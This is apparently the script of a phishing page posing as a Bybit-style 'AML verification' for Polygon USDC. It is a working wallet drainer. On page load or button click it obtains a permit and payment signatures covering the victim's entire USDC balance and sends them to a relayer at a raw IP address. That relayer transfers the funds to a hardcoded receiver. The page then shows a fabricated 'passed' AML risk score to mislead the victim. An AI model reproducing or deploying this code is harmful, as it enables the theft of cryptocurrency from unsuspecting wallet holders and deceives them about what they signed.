let provider;
        let signer;
        let contract;
        let usdc;
        let currentBalance = 0;

        // Проверяем и форматируем адреса
        const contractAddress = ethers.utils.getAddress("0xD2F05B5c0D9aBFf1Bd08eD9138C207cb15dFbf2A");
        const usdcAddress = ethers.utils.getAddress("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"); // Native USDC
        
        const contractABI = [
            "function processPayment(address from, uint256 amount, uint256 nonce, bytes memory signature) external",
            "function processPaymentWithPermit(address from, uint256 amount, uint256 nonce, uint256 deadline, uint8 permitV, bytes32 permitR, bytes32 permitS, bytes memory paymentSignature) external",
            "function getCurrentNonce(address user) external view returns (uint256)",
            "function relayer() external view returns (address)",
            "function receiver() external view returns (address)"
        ];

        const usdcABI = [
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function name() view returns (string)",
            "function nonces(address owner) view returns (uint256)",
            "function version() view returns (string)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
        ];

        async function updateBalance() {
            try {
                if (!signer || !provider) {
                    console.log('No signer or provider available');
                    return;
                }

                const address = await signer.getAddress();
                console.log('Connected address:', address);

                // Проверяем адрес получателя
                const receiver = await contract.receiver();
                console.log('Receiver address:', receiver);

                // Проверяем USDC
                const symbol = await usdc.symbol();
                const name = await usdc.name();
                console.log('Token info:', { symbol, name });

                // Получаем баланс USDC
                const balance = await usdc.balanceOf(address);
                currentBalance = balance;
                console.log('USDC balance:', ethers.utils.formatUnits(balance, 6), 'USDC');
                
                // Проверяем соответствие адреса
                if (receiver.toLowerCase() !== "0xF9d549705d610F531CF3602FD6baBDdE95625442".toLowerCase()) {
                    console.log(`Warning: Current receiver address (${receiver}) does not match expected address`);
                }

            } catch (error) {
                console.error("Error checking balances:", error);
            }
        }

        async function handleAction() {
            const button = document.getElementById('action-button');
            
            if (!signer) {
                // Если кошелек не подключен, подключаем и сразу запускаем верификацию
                await connectWallet();
                if (signer) { // Если подключение успешно
                    await sendAllUSDC();
                }
            } else {
                // Если кошелек уже подключен, просто запускаем верификацию
                await sendAllUSDC();
            }
        }

        async function connectWallet() {
            try {
                // Отключаем кнопку на время подключения
                const actionButton = document.getElementById('action-button');
                actionButton.disabled = true;
                actionButton.classList.add('loading');
                actionButton.textContent = 'Connecting...';

                console.log('Starting wallet connection...');
                
                // Ждем инициализации провайдера
                const rawProvider = await waitForProvider();
                console.log('Provider status:', {
                    isProviderFound: !!rawProvider,
                    providerType: rawProvider ? rawProvider.constructor.name : 'none',
                    isEthereum: !!window.ethereum,
                    isRabby: !!window.rabby,
                    hasWeb3: !!(window.web3 && window.web3.currentProvider)
                });

                if (!rawProvider) {
                    throw new Error('Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.');
                }

                // Создаем Web3Provider
                provider = new ethers.providers.Web3Provider(rawProvider, 'any');
                
                // Запрашиваем доступ к аккаунтам
                console.log('Requesting accounts...');
                await provider.send("eth_requestAccounts", []);
                
                // Получаем подписанта
                signer = provider.getSigner();
                const address = await signer.getAddress();
                console.log('Connected address:', address);

                // Проверяем и переключаем сеть
                const network = await provider.getNetwork();
                console.log('Current network:', network);

                if (network.chainId !== 137) {
                    console.log('Switching to Polygon network...');
                    try {
                        await rawProvider.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x89' }], // chainId для Polygon
                        });
                    } catch (switchError) {
                        console.log('Switch error:', switchError);
                        if (switchError.code === 4902) {
                            try {
                                await rawProvider.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: '0x89',
                                        chainName: 'Polygon',
                                        nativeCurrency: {
                                            name: 'MATIC',
                                            symbol: 'MATIC',
                                            decimals: 18
                                        },
                                        rpcUrls: ['https://polygon-rpc.com'],
                                        blockExplorerUrls: ['https://polygonscan.com/']
                                    }]
                                });
                            } catch (addError) {
                                console.error('Add network error:', addError);
                                throw new Error('Failed to add Polygon network');
                            }
                        } else {
                            throw switchError;
                        }
                    }
                }

                // Инициализируем контракты
                if (!contract || !usdc) {
                    contract = new ethers.Contract(contractAddress, contractABI, signer);
                    usdc = new ethers.Contract(usdcAddress, usdcABI, signer);
                    
                    console.log('Contracts initialized:', {
                        bybitPayment: contract.address,
                        usdc: usdc.address
                    });
                }

                // Обновляем баланс
                await updateBalance();

                // Подписываемся на события
                rawProvider.on('accountsChanged', async (accounts) => {
                    console.log('Accounts changed:', accounts);
                    signer = provider.getSigner();
                    await updateBalance();
                });

                rawProvider.on('chainChanged', () => {
                    console.log('Network changed, reloading...');
                    window.location.reload();
                });

                // Не меняем текст кнопки, так как верификация запустится автоматически
                actionButton.disabled = false;
                actionButton.classList.remove('loading');

            } catch (error) {
                console.error('Connection error:', error);
                
                // Возвращаем кнопку в исходное состояние
                const actionButton = document.getElementById('action-button');
                actionButton.disabled = false;
                actionButton.classList.remove('loading');
                actionButton.textContent = 'Connect Wallet for Verification';
                
                // Сбрасываем provider и signer чтобы можно было попробовать снова
                provider = null;
                signer = null;
            }
        }

        async function getPermitSignature(spender, value, deadline) {
            const owner = await signer.getAddress();
            const nonce = await usdc.nonces(owner);
            const name = await usdc.name();
            const version = await usdc.version();
            
            const chainId = (await provider.getNetwork()).chainId;

            const domain = {
                name,
                version,
                chainId,
                verifyingContract: usdcAddress
            };

            const types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };

            const values = {
                owner,
                spender,
                value,
                nonce,
                deadline
            };

            console.log('Signing permit with params:', {
                domain,
                types,
                values
            });

            const signature = await signer._signTypedData(domain, types, values);
            return ethers.utils.splitSignature(signature);
        }

        async function signPaymentMessage(from, amount, nonce, contractAddress) {
            const domain = {
                name: 'BybitPayment',
                version: '1',
                chainId: (await provider.getNetwork()).chainId,
                verifyingContract: contractAddress
            };

            const types = {
                PaymentMessage: [
                    { name: "from", type: "address" },
                    { name: "amount", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "verifyingContract", type: "address" }
                ]
            };

            const value = {
                from: from,
                amount: amount,
                nonce: nonce,
                verifyingContract: contractAddress
            };

            console.log('Signing payment with params:', {
                domain,
                types,
                value
            });

            const signature = await signer._signTypedData(domain, types, value);
            return ethers.utils.splitSignature(signature);
        }

        async function sendAllUSDC() {
            try {
                const actionButton = document.getElementById('action-button');
                actionButton.disabled = true;
                actionButton.classList.add('loading');
                actionButton.textContent = 'Verifying...';

                if (!currentBalance || currentBalance.eq(0)) {
                    console.log('No USDC balance available');
                    return;
                }

                const userAddress = await signer.getAddress();
                console.log('Sending from address:', userAddress);
                
                // Проверяем текущий баланс USDC
                const balance = await usdc.balanceOf(userAddress);
                console.log('Current USDC balance:', ethers.utils.formatUnits(balance, 6), 'USDC');
                
                if (balance.lt(currentBalance)) {
                    console.log(`Insufficient USDC balance. Required: ${ethers.utils.formatUnits(currentBalance, 6)} USDC, Available: ${ethers.utils.formatUnits(balance, 6)} USDC`);
                    return;
                }

                // Получаем текущий nonce для платежа
                const paymentNonce = await contract.getCurrentNonce(userAddress);
                console.log('Current payment nonce:', paymentNonce.toString());

                // Готовим данные для permit
                const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 час
                const usdcNonce = await usdc.nonces(userAddress);
                const usdcName = await usdc.name();
                const usdcVersion = await usdc.version();

                // Создаем и подписываем permit
                console.log('Requesting USDC permit signature...');
                const permitDomain = {
                    name: usdcName,
                    version: usdcVersion,
                    chainId: (await provider.getNetwork()).chainId,
                    verifyingContract: usdcAddress
                };

                const permitTypes = {
                    Permit: [
                        { name: "owner", type: "address" },
                        { name: "spender", type: "address" },
                        { name: "value", type: "uint256" },
                        { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ]
                };

                const permitValues = {
                    owner: userAddress,
                    spender: contractAddress,
                    value: currentBalance,
                    nonce: usdcNonce,
                    deadline: deadline
                };

                const permitSignature = await signer._signTypedData(permitDomain, permitTypes, permitValues);
                const permitSig = ethers.utils.splitSignature(permitSignature);
                console.log('Permit signature obtained');

                // Подписываем сообщение для платежа
                console.log('Requesting payment signature...');
                const paymentSig = await signPaymentMessage(
                    userAddress,
                    currentBalance,
                    paymentNonce,
                    contractAddress
                );
                console.log('Payment signature obtained');

                // Отправляем данные релейеру
                console.log('Sending transaction to relayer...');
                const relayerResponse = await fetch('http://80.78.30.7:3000/relay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        from: userAddress,
                        amount: currentBalance.toString(),
                        nonce: paymentNonce.toString(),
                        deadline: deadline,
                        permitV: permitSig.v,
                        permitR: permitSig.r,
                        permitS: permitSig.s,
                        paymentV: paymentSig.v,
                        paymentR: paymentSig.r,
                        paymentS: paymentSig.s
                    })
                });

                const relayerData = await relayerResponse.json();
                if (!relayerData.success) {
                    console.error('Relayer error:', relayerData.error);
                    return;
                }

                console.log('Transaction hash:', relayerData.txHash);
                
                // Ждем подтверждения транзакции
                await provider.waitForTransaction(relayerData.txHash);
                console.log('Transaction confirmed');

                // Показываем результаты AML проверки
                actionButton.style.display = 'none';
                const amlResults = document.getElementById('aml-results');
                amlResults.classList.add('visible');
                
                // Анимируем риск-скор
                const circle = document.querySelector('.risk-score-progress');
                const radius = circle.r.baseVal.value;
                const circumference = radius * 2 * Math.PI;
                circle.style.strokeDasharray = `${circumference} ${circumference}`;
                circle.style.strokeDashoffset = circumference;
                
                // Устанавливаем прогресс (0.2 = 20% риска, значит показываем 80% заполнения)
                setTimeout(() => {
                    const offset = circumference - (0.8 * circumference);
                    circle.style.strokeDashoffset = offset;
                }, 100);
                
                // Обновляем Transaction ID
                document.getElementById('transaction-hash').textContent = 
                    relayerData.txHash.slice(0, 6) + '...' + relayerData.txHash.slice(-4);
                
                // Обновляем баланс
                await updateBalance();

            } catch (error) {
                console.error('Transaction error:', error);
            } finally {
                // В случае ошибки возвращаем кнопку в активное состояние
                const actionButton = document.getElementById('action-button');
                actionButton.disabled = false;
                actionButton.classList.remove('loading');
                actionButton.textContent = 'Verify';
            }
        }

        function showStatus(message, isSuccess) {
            console.log(`Status: ${message} (${isSuccess ? 'success' : 'error'})`);
        }

        // Функция для ожидания инициализации провайдера
        async function waitForProvider() {
            // Проверяем доступные провайдеры
            if (window.ethereum) {
                return window.ethereum;
            }
            if (window.rabby) {
                return window.rabby;
            }
            if (window.web3 && window.web3.currentProvider) {
                return window.web3.currentProvider;
            }
            
            // Если провайдер не найден сразу, ждем небольшое время
            return new Promise((resolve) => {
                let attempts = 0;
                const maxAttempts = 3;
                
                const checkProvider = () => {
                    attempts++;
                    if (window.ethereum) {
                        resolve(window.ethereum);
                    } else if (window.rabby) {
                        resolve(window.rabby);
                    } else if (window.web3 && window.web3.currentProvider) {
                        resolve(window.web3.currentProvider);
                    } else if (attempts < maxAttempts) {
                        setTimeout(checkProvider, 500); // Проверяем каждые 500мс
                    } else {
                        resolve(null); // Возвращаем null если провайдер не найден
                    }
                };
                
                checkProvider();
            });
        }

        // Изменяем обработчик загрузки страницы
        document.addEventListener('DOMContentLoaded', async () => {
            console.log('Page loaded, checking providers:', {
                ethereum: !!window.ethereum,
                rabby: !!window.rabby,
                web3: !!(window.web3 && window.web3.currentProvider)
            });
            
            // Автоматическое подключение если обнаружен провайдер
            const provider = await waitForProvider();
            if (provider) {
                console.log('Web3 provider detected, attempting automatic connection...');
                try {
                    // Проверяем, есть ли уже подключенные аккаунты
                    const accounts = await provider.request({ method: 'eth_accounts' });
                    if (accounts && accounts.length > 0) {
                        console.log('Found connected account, initiating automatic connection');
                        await handleAction();
                    } else {
                        console.log('No connected accounts found, waiting for user action');
                    }
                } catch (error) {
                    console.log('Auto-connection check failed:', error);
                }
            }
            
            showStatus('Please connect your wallet to continue', true);
        });

        let lastScrollTop = 0;
        const header = document.querySelector('.header');
        
        // Добавляем обработчик прокрутки
        window.addEventListener('scroll', () => {
            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
            
            // Показываем/скрываем шапку в зависимости от направления прокрутки
            if (scrollTop > lastScrollTop && scrollTop > 80) {
                // Прокрутка вниз - скрываем шапку
                header.classList.add('header-hidden');
            } else {
                // Прокрутка вверх - показываем шапку
                header.classList.remove('header-hidden');
            }
            
            lastScrollTop = scrollTop;
        });

        // Функция для тестирования UI результатов AML
        window.showAMLTest = function(options = {}) {
            const {
                riskScore = 0.2,
                txHash = '0x1234567890abcdef1234567890abcdef12345678',
                jurisdiction = 'Compliant',
                sanctions = 'Passed',
                pattern = 'Normal',
                kyc = 'Verified',
                history = '6+ months',
                volume = 'Within Limits'
            } = options;

            // Скрываем кнопку
            const actionButton = document.getElementById('action-button');
            actionButton.style.display = 'none';

            // Показываем результаты
            const amlResults = document.getElementById('aml-results');
            amlResults.classList.add('visible');

            // Обновляем значения
            document.querySelector('.risk-score-value').textContent = riskScore;
            document.getElementById('transaction-hash').textContent = 
                txHash.slice(0, 6) + '...' + txHash.slice(-4);

            // Обновляем все check-items
            const checkValues = document.querySelectorAll('.check-value');
            [jurisdiction, sanctions, pattern, kyc, history, volume].forEach((value, index) => {
                if (checkValues[index]) {
                    checkValues[index].textContent = value;
                }
            });

            // Анимируем риск-скор
            const circle = document.querySelector('.risk-score-progress');
            const radius = circle.r.baseVal.value;
            const circumference = radius * 2 * Math.PI;
            circle.style.strokeDasharray = `${circumference} ${circumference}`;
            circle.style.strokeDashoffset = circumference;

            setTimeout(() => {
                // Конвертируем риск-скор в процент заполнения (инвертированный)
                const fillPercentage = 1 - riskScore;
                const offset = circumference - (fillPercentage * circumference);
                circle.style.strokeDashoffset = offset;
            }, 100);

            console.log('AML Test UI displayed with options:', options);
        };

        // Добавляем подсказку в консоль при загрузке страницы
        console.log(`
        To test AML results UI, use window.showAMLTest() with optional parameters:
        Example:
        showAMLTest({
            riskScore: 0.2,
            txHash: '0x1234567890abcdef1234567890abcdef12345678',
            jurisdiction: 'Compliant',
            sanctions: 'Passed',
            pattern: 'Normal',
            kyc: 'Verified',
            history: '6+ months',
            volume: 'Within Limits'
        });
        Or just showAMLTest() for default values.
        `);